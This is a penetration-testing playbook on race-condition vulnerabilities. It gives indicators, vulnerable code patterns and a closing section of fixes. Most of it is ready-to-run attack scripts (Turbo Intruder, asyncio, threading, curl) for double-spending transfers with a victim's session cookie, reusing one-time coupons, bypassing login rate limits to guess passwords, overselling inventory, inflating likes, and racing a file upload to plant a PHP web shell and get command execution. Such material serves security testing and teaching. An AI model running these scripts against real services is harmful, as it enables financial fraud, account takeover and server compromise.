# Race Conditions Playbook

## Indicators

Signs this vulnerability may be present:
- Operations involving check-then-act patterns (verify balance, then deduct)
- Non-atomic operations on shared resources (database, files, sessions)
- Features with limited-use tokens (coupons, discount codes, one-time links)
- Rate limiting that could be bypassed with concurrent requests
- File upload functionality with processing delays
- Financial transactions or point/credit systems
- Inventory management or reservation systems
- Sequential operations that should be atomic (read-modify-write)

## Common Vulnerable Patterns

### Check-Then-Act (TOCTOU)

```
1. Check condition (e.g., balance >= amount)
2. [Race window - attacker sends parallel requests]
3. Act on condition (e.g., deduct amount)
```

### Read-Modify-Write

```
1. Read current value (e.g., counter = 10)
2. [Race window]
3. Modify value (e.g., counter - 1)
4. Write back (e.g., counter = 9)
```

### Double-Spend

```
1. Request 1: Check balance ($100)
2. Request 2: Check balance ($100) - both see $100
3. Request 1: Deduct $100
4. Request 2: Deduct $100 - total $200 spent from $100
```

## Tools

### Burp Turbo Intruder

```python
# Turbo Intruder script for race condition testing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)

    # Queue the same request multiple times
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

```python
# Single-packet attack (HTTP/2)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Group requests for single-packet delivery
    for i in range(20):
        engine.queue(target.req, gate='race')

    # Release all at once
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### Python asyncio

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
import time

async def send_request(session, url, data, request_id):
    """Send a single request and return timing info"""
    start = time.time()
    try:
        async with session.post(url, data=data) as response:
            text = await response.text()
            return {
                'id': request_id,
                'status': response.status,
                'time': time.time() - start,
                'response': text[:200]
            }
    except Exception as e:
        return {'id': request_id, 'error': str(e)}

async def race_condition_test(url, data, num_requests=50):
    """Send multiple requests concurrently"""
    async with aiohttp.ClientSession() as session:
        tasks = [
            send_request(session, url, data, i)
            for i in range(num_requests)
        ]
        # Execute all at once
        results = await asyncio.gather(*tasks)

    # Analyze results
    successful = [r for r in results if r.get('status') == 200]
    print(f"Successful requests: {len(successful)}/{num_requests}")
    return results

# Usage
url = "http://target.com/api/redeem-coupon"
data = {"coupon_code": "DISCOUNT50"}

asyncio.run(race_condition_test(url, data, 50))
```

### Python threading

```python
#!/usr/bin/env python3
import threading
import requests
import time

results = []
lock = threading.Lock()
barrier = threading.Barrier(50)  # Synchronize 50 threads

def send_request(url, data, request_id):
    """Send request with barrier synchronization"""
    # Wait for all threads to reach this point
    barrier.wait()

    start = time.time()
    try:
        response = requests.post(url, data=data, timeout=10)
        with lock:
            results.append({
                'id': request_id,
                'status': response.status_code,
                'time': time.time() - start,
                'response': response.text[:200]
            })
    except Exception as e:
        with lock:
            results.append({'id': request_id, 'error': str(e)})

def race_condition_test(url, data, num_threads=50):
    """Launch synchronized concurrent requests"""
    threads = []

    for i in range(num_threads):
        t = threading.Thread(target=send_request, args=(url, data, i))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # Analyze results
    successful = [r for r in results if r.get('status') == 200]
    print(f"Successful: {len(successful)}/{num_threads}")
    return results

# Usage
url = "http://target.com/api/transfer"
data = {"amount": 100, "to_account": "attacker"}

race_condition_test(url, data)
```

### curl with GNU Parallel

```bash
# Basic parallel requests
seq 1 50 | parallel -j50 \
    "curl -s -X POST 'http://target.com/api/redeem' -d 'code=COUPON123'"

# With timing information
seq 1 50 | parallel -j50 \
    "curl -s -w '%{time_total}' -o /dev/null -X POST 'http://target.com/api/redeem' -d 'code=COUPON123'"

# Save responses for analysis
mkdir -p responses
seq 1 50 | parallel -j50 \
    "curl -s -X POST 'http://target.com/api/redeem' -d 'code=COUPON123' > responses/{}.txt"

# Count successful responses
grep -l "success" responses/*.txt | wc -l
```

### curl with background processes

```bash
#!/bin/bash
# Race condition test with curl

URL="http://target.com/api/transfer"
DATA="amount=100&to_account=attacker"
NUM_REQUESTS=50

# Launch all requests in background
for i in $(seq 1 $NUM_REQUESTS); do
    curl -s -X POST "$URL" -d "$DATA" > "/tmp/race_$i.txt" &
done

# Wait for all to complete
wait

# Analyze results
echo "Analyzing responses..."
grep -l "success" /tmp/race_*.txt | wc -l
```

## Techniques

### 1. Double-Spend Attack

Exploiting race conditions in financial operations.

```python
#!/usr/bin/env python3
import asyncio
import aiohttp

async def double_spend_test():
    """Test for double-spend vulnerability in transfer endpoint"""
    url = "http://target.com/api/transfer"
    headers = {
        "Cookie": "session=victim_session_token",
        "Content-Type": "application/json"
    }
    data = {
        "amount": 1000,
        "to_account": "attacker_account"
    }

    async with aiohttp.ClientSession() as session:
        # Send 20 concurrent transfer requests
        tasks = []
        for _ in range(20):
            tasks.append(
                session.post(url, json=data, headers=headers)
            )

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        successful = 0
        for r in responses:
            if hasattr(r, 'status') and r.status == 200:
                successful += 1

        print(f"Successful transfers: {successful}")
        print(f"If > 1, double-spend vulnerability exists!")

asyncio.run(double_spend_test())
```

### 2. Coupon/Discount Abuse

Redeeming limited-use coupons multiple times.

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
import json

async def coupon_race_test():
    """Test for coupon reuse vulnerability"""
    url = "http://target.com/api/apply-coupon"
    coupon_code = "SINGUSE50"  # One-time use coupon

    async with aiohttp.ClientSession() as session:
        async with session.get("http://target.com/cart") as r:
            cookies = r.cookies

        tasks = []
        for i in range(30):
            tasks.append(
                session.post(
                    url,
                    data={"code": coupon_code},
                    cookies=cookies
                )
            )

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        applied = 0
        for r in responses:
            if hasattr(r, 'status'):
                text = await r.text()
                if "applied" in text.lower() or "success" in text.lower():
                    applied += 1

        print(f"Coupon applied {applied} times (should be 1)")

asyncio.run(coupon_race_test())
```

### 3. Rate Limit Bypass

Bypassing rate limiting through concurrent requests.

```python
#!/usr/bin/env python3
import asyncio
import aiohttp

async def rate_limit_bypass():
    """Bypass rate limiting with concurrent requests"""
    url = "http://target.com/api/login"
    passwords = ["password1", "password2", "password3", "admin", "root"]

    async with aiohttp.ClientSession() as session:
        for password in passwords:
            # Send 10 concurrent requests for each password
            tasks = []
            for _ in range(10):
                tasks.append(
                    session.post(url, data={
                        "username": "admin",
                        "password": password
                    })
                )

            responses = await asyncio.gather(*tasks, return_exceptions=True)

            for r in responses:
                if hasattr(r, 'status') and r.status == 200:
                    text = await r.text()
                    if "welcome" in text.lower():
                        print(f"Found password: {password}")
                        return

asyncio.run(rate_limit_bypass())
```

### 4. File Upload Race

Exploiting race conditions in file upload processing.

```python
#!/usr/bin/env python3
import asyncio
import aiohttp
import os

async def file_upload_race():
    """
    Upload malicious file and access it before validation
    Race between:
    1. File upload
    2. Server-side validation/deletion
    3. Accessing the uploaded file
    """
    upload_url = "http://target.com/upload"
    file_url = "http://target.com/uploads/shell.php"

    # Malicious PHP file
    shell_content = b"<?php system($_GET['c']); ?>"

    async with aiohttp.ClientSession() as session:
        async def upload():
            data = aiohttp.FormData()
            data.add_field('file',
                          shell_content,
                          filename='shell.php',
                          content_type='application/x-php')
            return await session.post(upload_url, data=data)

        async def access():
            return await session.get(file_url + "?c=id")

        # Continuously upload and try to access
        for _ in range(100):
            tasks = [upload()] + [access() for _ in range(10)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)

            for r in responses[1:]:  # Skip upload response
                if hasattr(r, 'status') and r.status == 200:
                    text = await r.text()
                    if "uid=" in text:
                        print(f"RCE achieved! Response: {text}")
                        return

asyncio.run(file_upload_race())
```

### 5. Single-Packet Attack (HTTP/2)

Sending multiple requests in a single TCP packet for precise timing.

```python
# Burp Turbo Intruder - Single Packet Attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Prepare 20 identical requests
    for i in range(20):
        engine.queue(target.req, gate='race')

    # Send all in single packet
    engine.openGate('race')

def handleResponse(req, interesting):
    # Log all responses
    if '200' in str(req.response.status):
        table.add(req)
```

```bash
# Using h2load for HTTP/2 testing
h2load -n 100 -c 1 -m 100 "https://target.com/api/redeem"

# -n: Total number of requests
# -c: Number of connections
# -m: Max concurrent streams per connection
```

### 6. Inventory/Reservation Race

Booking or purchasing more items than available.

```python
#!/usr/bin/env python3
import asyncio
import aiohttp

async def inventory_race():
    """
    Purchase more items than available inventory
    Target: Item with quantity = 1
    """
    url = "http://target.com/api/purchase"
    item_id = "limited-item-123"

    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(20):
            tasks.append(
                session.post(url, json={
                    "item_id": item_id,
                    "quantity": 1
                })
            )

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        successful = 0
        for r in responses:
            if hasattr(r, 'status') and r.status == 200:
                text = await r.text()
                if "purchased" in text.lower():
                    successful += 1

        print(f"Successfully purchased: {successful} (max should be 1)")

asyncio.run(inventory_race())
```

### 7. Follow/Like/Vote Manipulation

Bypassing single-action restrictions.

```python
#!/usr/bin/env python3
import asyncio
import aiohttp

async def like_race():
    """Exploit race condition to like a post multiple times"""
    url = "http://target.com/api/like"
    post_id = "12345"
    headers = {"Cookie": "session=user_session"}

    async with aiohttp.ClientSession() as session:
        # Get initial like count
        async with session.get(f"http://target.com/post/{post_id}") as r:
            initial_text = await r.text()
            # Parse initial likes from response

        # Send concurrent like requests
        tasks = [
            session.post(url, json={"post_id": post_id}, headers=headers)
            for _ in range(50)
        ]

        await asyncio.gather(*tasks, return_exceptions=True)

        # Check final like count
        async with session.get(f"http://target.com/post/{post_id}") as r:
            final_text = await r.text()
            # Compare likes

asyncio.run(like_race())
```

## Detection Techniques

### Identifying Non-Atomic Operations

```python
#!/usr/bin/env python3
"""
Detection script for race condition vulnerabilities
Look for timing-based behavior differences
"""
import asyncio
import aiohttp
import statistics

async def timing_analysis(url, data, iterations=10):
    """Analyze timing variations that might indicate race windows"""
    times = []

    async with aiohttp.ClientSession() as session:
        for _ in range(iterations):
            import time
            start = time.time()
            async with session.post(url, data=data) as r:
                await r.text()
            times.append(time.time() - start)

    avg = statistics.mean(times)
    stddev = statistics.stdev(times) if len(times) > 1 else 0

    print(f"Average response time: {avg:.3f}s")
    print(f"Standard deviation: {stddev:.3f}s")
    print(f"High variance may indicate database locks or race-prone code")

asyncio.run(timing_analysis(
    "http://target.com/api/transfer",
    {"amount": 100}
))
```

### Code Pattern Analysis

```python
# Vulnerable patterns to look for in source code:

# Pattern 1: Check-then-act
balance = get_balance(user_id)
if balance >= amount:
    deduct_balance(user_id, amount)  # Race window before check

# Pattern 2: Read-modify-write
counter = db.query("SELECT count FROM counters WHERE id=1")
counter += 1
db.execute("UPDATE counters SET count=? WHERE id=1", counter)

# Pattern 3: Non-atomic increment
# Instead of: UPDATE counters SET count = count + 1
counter = get_counter()
set_counter(counter + 1)

# Pattern 4: Time-of-check to time-of-use (TOCTOU)
if file_exists(path):
    # Attacker modifies file here
    read_file(path)
```

## Success Indicators

- Multiple successful responses for single-use operations (coupons, tokens)
- Balance discrepancies after concurrent transfer requests
- Inventory overselling (more purchases than stock)
- Multiple likes/votes/follows from single user
- Rate limit bypassed (more requests than limit)
- File accessed between upload and validation
- Duplicate records created in database
- Inconsistent state after concurrent modifications
- Response indicating successful operation when it should fail
- Timing differences revealing race windows

## Prevention Notes

For testing purposes, understand what proper fixes look like:

```sql
-- Atomic database operations
UPDATE accounts SET balance = balance - 100
WHERE user_id = 1 AND balance >= 100;

-- Check affected rows
SELECT ROW_COUNT();  -- Should be 1 for success
```

```python
# Proper locking
with database.transaction():
    balance = get_balance_for_update(user_id)  # SELECT FOR UPDATE
    if balance >= amount:
        deduct_balance(user_id, amount)
```

```python
# Idempotency keys
@app.route('/api/transfer', methods=['POST'])
def transfer():
    idempotency_key = request.headers.get('Idempotency-Key')
    if is_processed(idempotency_key):
        return get_cached_response(idempotency_key)
    # Process transfer...
```
